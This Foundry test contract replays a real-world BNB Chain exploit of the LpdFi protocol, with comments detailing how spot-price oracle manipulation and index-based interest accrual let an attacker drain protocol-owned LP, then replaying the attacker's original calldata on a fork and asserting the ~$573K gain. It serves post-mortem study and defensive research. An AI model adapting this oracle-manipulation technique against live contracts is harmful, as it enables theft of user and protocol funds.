// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

// LpdFi (LOOPSDAO) - spot-price oracle manipulation lets an attacker mint an inflated
//                    interest-bearing principal, then drain protocol-owned Cake-LP.
// BNB Chain. ~$573K attacker net gain. Root cause per DarkNavy writeup, verified below by
// tracing the two on-chain txs from scratch.
//
// Setup tx : 0xbb5b8573d7203e00f8fb9d4839dbeea46a8efd367eac8bed81e4ece2341c3588
//            block 113613923, ts 1785686399 (2026-08-02 15:59:59 UTC).
// Claim tx : 0x70bbe0aa3c7ef149ecb6128a06025885deaa8fef3f393a505d447d28ab3315d6
//            block 113613924, ts 1785686400 (2026-08-02 16:00:00 UTC), exactly 1 second later.
//
// Both txs are plain calls from the attacker EOA into the attacker's own pre-deployed executor
// contract (to != from, so NO EIP-7702). Every victim entrypoint the executor reaches is a
// permissionless public function - LpdFi.buy(uAmount), LpdFi.claimInterest(index), and
// PancakeSwap swaps. No signer, admin role, governance, or proxy upgrade is involved. Verified
// against the trace: the attacker EOA simply funds the executor with 116,495 USDC and calls it
// twice.
//
// Root cause (the actual bug):
//   - Lpd.price() values the LPD token from the INSTANTANEOUS reserves of a thin PancakeSwap
//     LPD/USDC pair (0x85346d31...). No TWAP, no liquidity floor, no deviation bound.
//   - LpdFi.buy(uAmount) lets the caller name a nominal USDC principal and uses that manipulable
//     spot price only to size the LPD deposit. Push LPD spot up ~5,163x and the LPD deposit
//     required to register a 140,324,732 USDC principal collapses to ~214,171 LPD.
//   - getOrder() accrues interest from the discrete (issue - lastIssue) index difference, not
//     elapsed wall time. Crossing the daily issue boundary after just 1 second credits a full
//     0.5% period: 140,324,732 * 0.5% = 701,623.66 USDC of "interest".
//   - claimInterest() funds that entitlement by removing protocol-owned Cake-LP with both
//     PancakeRouter min-outputs set to zero.
//
// Attack (executed by the executor bytecode, replayed here verbatim):
//   1. Setup tx (block 113613923): executor takes 116,495 USDC + temporary liquidity, swaps
//      43,714,602.6 USDC into the LPD/USDC pool (LPD 0.126899 -> 655.197923 USDC/LPD, 5,163x),
//      calls buy(140324732e18) at the inflated price, reverses the manip, repays temp liquidity.
//      LPD is fee-on-transfer, so the reverse swap's 4,573,892.98 LPD only credits 4,116,503.68
//      to the pair - the executor bytecode already models that, we just replay it.
//   2. Claim tx (block 113613924, +1s): issue index rolls 18 -> 19, claimInterest(0) removes
//      1,678,049.359669752344366455 Cake-LP and pays the executor 693,529.79 USDC + a fee
//      address 7,005.35 USDC. Executor swaps 4,000 USDC to BNB and forwards 689,529.793138... USDC
//      to the attacker EOA.
//
// Net: EOA holds 116,495 USDC before setup and 689,529.793138448987344168 USDC after claim, so
//      net gain = 573,034.793138448987344168 USDC (the ~690K terminal inflow minus the 116,495
//      the EOA staked into the setup tx). This is the figure asserted below.
//
// Reproduction: this needs REAL elapsed state across two consecutive blocks (the issue-boundary
// crossing at ts 1785686400), so it cannot be collapsed into one block. Fork at the setup tx's
// parent (113613922), replay the setup calldata at block 113613923 / ts 1785686399, advance one
// block and one second, then replay the claim calldata at block 113613924 / ts 1785686400. The
// executor and all protocol state already exist on-chain at the fork block; we only re-issue the
// two original calldatas, pranking the attacker EOA as msg.sender and tx.origin.
//
// Run:
//   forge test --contracts ./src/test/2026-08/LpdFi_exp.sol --evm-version cancun -vvv
//   (cancun REQUIRED: the executor uses transient storage (TSTORE/TLOAD) for its temporary-
//    liquidity callbacks. Needs an ARCHIVE BSC RPC.)

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

contract LpdFiExp is Test {
    address constant ATTACKER = 0x5d289266d85EF671561bA3F253FB79327C193f33; // attacker EOA
    address constant EXECUTOR = 0x7f5AD0A998Dcb3f5006F0D152BEBC055979EF711; // attacker exploit contract
    address constant LPDFI = 0xcE6A6e4413D85A136bBaC8AaE6fB46eAa77F295e; // vulnerable LpdFi
    address constant LPD = 0x38763EebE58a69C9CC91876947D9fB83e1273604; // fee-on-transfer, spot-price source
    address constant PAIR = 0x85346d31743796F7d00D675629e32783A968F210; // LPD/USDC pair
    address constant USDC = 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d; // BSC USDC (18 decimals)

    uint256 constant SETUP_BLOCK = 113_613_923;
    uint256 constant CLAIM_BLOCK = 113_613_924;
    uint256 constant SETUP_TS = 1_785_686_399; // 2026-08-02 15:59:59 UTC, issue 18
    uint256 constant CLAIM_TS = 1_785_686_400; // 2026-08-02 16:00:00 UTC, issue 19

    // Archive BSC RPC (repo `bsc` alias is not archive locally / was unreachable at build time).
    string constant BSC_ARCHIVE = "https://bsc-mainnet.public.blastapi.io";

    // Exact original calldata, byte-for-byte from the two txs.
    // Setup: selector 0x56956291(uint256 deadline, address) - deadline 0x6a6f697f, addr 0x1266c6be...
    bytes constant SETUP_CALLDATA =
        hex"56956291000000000000000000000000000000000000000000000000000000006a6f697f0000000000000000000000001266c6be60392a8ff346e8d5eccd3e69dd9c5f20";
    // Claim: selector 0x33bfa99d(uint256 deadline, address) - deadline 0x6a6f6980, addr 0x4848489f...
    bytes constant CLAIM_CALLDATA =
        hex"33bfa99d000000000000000000000000000000000000000000000000000000006a6f69800000000000000000000000004848489f0b2bedd788c696e2d79b6b69d7484848";

    uint256 constant SETUP_VALUE = 0.1 ether; // BNB sent with the original setup tx

    function setUp() public {
        // Fork at the setup tx's PARENT block: post-state of 113613922 == pre-state of 113613923.
        vm.createSelectFork(BSC_ARCHIVE, SETUP_BLOCK - 1);
        vm.label(ATTACKER, "AttackerEOA");
        vm.label(EXECUTOR, "Executor");
        vm.label(LPDFI, "LpdFi");
        vm.label(LPD, "LPD");
        vm.label(PAIR, "LPD/USDC-Pair");
        vm.label(USDC, "USDC");
    }

    function testExploit() public {
        // Sanity: this is a plain contract call, not a 7702 self-delegation.
        assertTrue(ATTACKER.code.length == 0, "attacker EOA should have no code (no 7702)");
        assertTrue(EXECUTOR.code.length > 0, "executor bytecode must exist at fork block");

        uint256 usdcPre = IERC20(USDC).balanceOf(ATTACKER);
        emit log_named_decimal_uint("Attacker USDC before", usdcPre, 18);
        assertEq(usdcPre, 116_495 ether, "expected the real 116,495 USDC stake on-chain");

        // --- Setup tx: replay at block 113613923 / ts 1785686399 (issue index 18) ---
        vm.roll(SETUP_BLOCK);
        vm.warp(SETUP_TS);
        vm.deal(ATTACKER, ATTACKER.balance + SETUP_VALUE); // cover the 0.1 BNB the tx forwards
        vm.prank(ATTACKER, ATTACKER); // msg.sender AND tx.origin = attacker EOA
        (bool ok1,) = EXECUTOR.call{value: SETUP_VALUE}(SETUP_CALLDATA);
        require(ok1, "setup tx reverted");

        // --- Advance one block and exactly one second: issue index rolls 18 -> 19 ---
        vm.roll(CLAIM_BLOCK);
        vm.warp(CLAIM_TS);

        // --- Claim tx: replay at block 113613924 / ts 1785686400 (issue index 19) ---
        vm.prank(ATTACKER, ATTACKER);
        (bool ok2,) = EXECUTOR.call(CLAIM_CALLDATA);
        require(ok2, "claim tx reverted");

        uint256 usdcPost = IERC20(USDC).balanceOf(ATTACKER);
        uint256 gain = usdcPost - usdcPre;
        emit log_named_decimal_uint("Attacker USDC after ", usdcPost, 18);
        emit log_named_decimal_uint("Attacker net USDC gain", gain, 18);

        // Net across BOTH txs: 689,529.793138448987344168 - 116,495 = 573,034.793138448987344168.
        assertApproxEqAbs(gain, 573_034.79 ether, 1 ether, "unexpected attacker net USDC gain");
    }
}
